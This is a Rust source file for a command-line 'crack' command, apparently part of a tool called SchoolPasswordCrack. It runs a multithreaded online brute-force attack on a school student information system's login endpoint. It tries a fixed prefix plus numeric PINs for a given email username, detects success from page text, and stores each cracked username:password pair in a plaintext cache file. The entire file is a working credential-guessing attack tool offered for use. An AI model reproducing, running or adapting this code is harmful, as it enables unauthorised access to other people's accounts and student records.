// STD modules
use std::fs::OpenOptions;
use std::io::Read;
use std::io::Write;
use std::path::Path;
use std::sync::mpsc;
use std::thread;
use std::time;
use std::time::Instant;
use std::time::SystemTime;

// External Crates
use home::home_dir;
use regex::Regex;
use ureq::Agent;

// Internal Modules
use super::super::arg_parse;
use super::super::BASE_PAGE;
use super::color;
use super::color::Color;
use super::Command;

// This took too long to make...
const SPINNER: [char; 10] = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'];
static mut RUNNING: bool = true;

pub fn command() -> Command {
    Command::new(
        "crack",
        "Crack A password",
        "crack <username> [-t Threads] [-p Prefix] [-nc No Cache] [--len Digets to Crack] [--cache Cache Path] [--page BasePage]",
        |args| {
            if args.len() <= 2 {
                color_print!(Color::Red, "[*] Not enough args supplied");
                return;
            }

            let default_cache = home_dir().unwrap().join(Path::new(".SchoolPasswordCrack/cache"));

            // Parse the args
            let threads: &u32 = &arg_parse::get_arg_value(args, "-t")
                .unwrap_or("16")
                .parse::<u32>()
                .unwrap();
            let prefix: &str = arg_parse::get_arg_value(args, "-p").unwrap_or("30");
            let no_cache: bool = arg_parse::get_arg_value(args, "-nc").is_some();
            let pass_len: u32 = arg_parse::get_arg_value(args, "--len").unwrap_or("4").parse().unwrap();
            let cache_path: &str = arg_parse::get_arg_value(args, "--cache").unwrap_or_else(|| default_cache.to_str().unwrap());
            let base_page: &str = arg_parse::get_arg_value(args, "--page").unwrap_or(BASE_PAGE);

            // Get Username
            let mut username: String = "".to_string();
            let mut i = 2;
            while i < args.len() {
                if args[i].starts_with('-') {
                    i += 2;
                    continue;
                }
                username = (&args[i]).to_string();
                break;
            }
            if username.is_empty() {
                color_print!(Color::Red, "[-] No username supplied");
                return;
            }
            let email = Regex::new(r"[^@ \t\r\n]+@[^@ \t\r\n]+\.[^@ \t\r\n]+").unwrap();
            if !email.is_match(&username) {
                color_print!(
                    Color::Red,
                    "[-] The username supplied is not a valid Email..."
                );
            }

            let cache = match no_cache {
                true => None,
                false => Some(cache_path),
            };

            color_print!(
                Color::Green,
                "\n[*] Starting Crack on {}",
                &color::color(&username, Color::Blue)
            );

            color_print!(Color::Magenta, "[i] Prefix: {}", prefix);
            color_print!(Color::Magenta, "[i] Threads: {}", &threads.to_string());
            color_print!(Color::Magenta, "[i] Crack Length: {}", &pass_len.to_string());
            color_print!(Color::Magenta, "[i] Cache: {}", cache.unwrap_or("None"));
            color_print!(Color::Magenta, "[i] Base Page: {}", base_page);
            println!();

            // Check if we have a cache of the username and if so, use it
            if let Some(cache) =  cache {
                if Path::new(cache).exists() {
                    let mut file = OpenOptions::new()
                        .read(true)
                        .open(cache)
                        .unwrap();

                    let mut data = String::new();
                    file.read_to_string(&mut data).unwrap();

                    for line in data.lines() {
                        if line.is_empty() {
                            continue;
                        }

                        let mut entry = line.split(':');
                        let user = entry.next().unwrap();
                        let pass = entry.next().unwrap();

                        if username == user {
                            println!(
                                "\r{} {} {}",
                                color::color("[+] Password found:", Color::Green),
                                color::color(pass, Color::Blue),
                                color::color("[CACHE]", Color::Red)
                            );
                            return;
                        }
                    }
                }
            }

            // C R A C K
            crack(&username, *threads as u32, base_page, prefix, pass_len, cache);
        },
    )
}

struct Cracker {
    instance: u32,
    end_index: u32,
    start_index: u32,
    password_len: u32,
    prefix: String,
    username: String,
    base_url: String,
}

/// 🍘
impl Cracker {
    fn new(
        instance: u32,
        end_index: u32,
        start_index: u32,
        password_len: u32,
        username: &str,
        base_url: &str,
        prefix: &str,
    ) -> Cracker {
        Cracker {
            instance,
            end_index,
            start_index,
            password_len,
            prefix: prefix.to_string(),
            username: username.to_string(),
            base_url: base_url.to_string(),
        }
    }

    fn clone(self) -> Cracker {
        Cracker {
            instance: self.instance,
            end_index: self.end_index,
            start_index: self.start_index,
            password_len: self.password_len,
            prefix: self.prefix,
            username: self.username,
            base_url: self.base_url,
        }
    }

    fn start(&self, tx: mpsc::Sender<Message>) {
        // Login Page
        let page: &str = &format!("{}/sis/j_security_check", self.base_url);

        let mut i: u32 = self.start_index as u32;
        while i < self.end_index {
            // Exit if no need to continue
            if !unsafe { RUNNING } {
                i = self.end_index;
            }

            // Gen password guess
            let to_try: &str = &format!(
                "{}{:0width$}",
                &self.prefix,
                i,
                width = self.password_len as usize
            );

            // Make an agent
            let agent: Agent = Agent::new();

            // Refresh Token
            agent
                .get(&format!("{}/sis/view", self.base_url))
                .call()
                .unwrap_or_else(|_| ureq::Response::new(500, "", "").unwrap());

            // Send Username and Password attempt to server
            let body = match agent
                .post(page)
                .query("j_username", &self.username)
                .query("j_password", to_try)
                .call()
            {
                Ok(body) => body.into_string().unwrap_or_else(|_| "".to_string()),
                Err(_) => continue,
            };

            i += 1;

            // If not logged in try next password
            if !body.contains("Account is inactive") && !body.contains("workStudentId") {
                let _ = tx.send(Message::NotFound);
                continue;
            }

            let _ = tx.send(Message::Found(to_try.to_string()));
        }
        let _ = tx.send(Message::End);
    }
}

/// System of crackers working together
struct System {
    crackers: Vec<Cracker>,
    passwords: u32,
    threads: u32,
}

impl System {
    fn new(passwords: u32, threads: u32) -> System {
        System {
            crackers: Vec::new(),
            passwords,
            threads,
        }
    }

    fn add_cracker(&mut self, cracker: Cracker) {
        self.crackers.push(cracker);
    }
}

enum Message {
    Found(String),
    NotFound,
    End,
}

pub fn crack(
    username: &str,
    threads: u32,
    base_url: &str,
    raw_prefix: &str,
    crack_len: u32,
    cache: Option<&str>,
) {
    // Start Timer
    let start_time = SystemTime::now();

    // Gen upper limit for passwod search
    // Ex for 4 diget password (2 diget prefix) this will giv 9999
    let mut passwords = 9;
    for _ in 1..crack_len {
        passwords *= 10;
        passwords += 9;
    }

    // Make a new System
    let mut system: System = System::new(passwords, threads);

    // Add a new cracker to the system for each thread
    for i in 0..system.threads {
        let start_index = system.passwords / system.threads as u32;
        let mut end_index = start_index * (i + 1);
        if i == system.threads - 1 {
            end_index = system.passwords as u32;
        }
        system.add_cracker(Cracker::new(
            i,
            end_index,
            start_index * i,
            crack_len,
            username,
            base_url,
            raw_prefix,
        ));
    }

    // Init Vars
    let mut update: Instant = time::Instant::now();
    let mut threads = Vec::new();
    let mut running: u32 = 0;
    let mut spin: usize = 0;
    let mut tried: u32 = 0;

    // Init Channel
    let (tx, rx) = mpsc::channel();

    // Start the Threads
    for i in system.crackers {
        running += 1;

        let cracker = i.clone();
        let new_tx = tx.clone();

        threads.push(thread::spawn(move || {
            cracker.start(new_tx);
        }));
    }

    'main: while running > 0 {
        // Get any messages
        if let Ok(msg) = rx.try_recv() {
            match msg {
                Message::Found(password) => {
                    print!(
                        "\r{} {}",
                        color::color("[+] Password found:", Color::Green),
                        color::color(&password, Color::Blue)
                    );
                    unsafe { RUNNING = false }
                    if let Some(cache) = cache {
                        cache_password(cache, username, &password);
                    }
                    break 'main;
                }
                Message::NotFound => tried += 1,
                Message::End => running -= 1,
            }
        };

        // Redraw spinner only once per 100ms
        if update.elapsed().as_millis() < 100 {
            continue;
        }
        update = time::Instant::now();

        // Get spinner char
        let spin_char = SPINNER.iter().nth(spin).unwrap();
        spin = (spin + 1) % SPINNER.len();

        print!(
            "{} {}",
            color::color(
                &format!("\r[{}] Cracking", &spin_char.to_string()),
                Color::Cyan
            ),
            color::color(
                &format!("( {}% )", (tried as f32 / 9999.0 * 100.0) as u32),
                Color::Blue
            )
        );
        std::io::stdout().flush().expect("Err flushing STD Out");
    }

    if unsafe { RUNNING } {
        print!("{}", color::color("\r[-] Password not found", Color::Red));
    }

    color_print!(
        Color::Green,
        "\n[*] All Done - Took {}s",
        &start_time.elapsed().unwrap().as_secs().to_string()
    );
}

/// Save found password to cache
fn cache_password(cache: &str, username: &str, password: &str) {
    // Make folder
    std::fs::create_dir_all(Path::new(cache).parent().unwrap()).unwrap();

    // Open file
    let mut file = OpenOptions::new()
        .write(true)
        .create(true)
        .append(true)
        .open(cache)
        .unwrap();

    // Append to file
    if let Err(e) = writeln!(file, "{}:{}", username, password) {
        eprintln!("Error writing to cache... {}", e);
    }
}
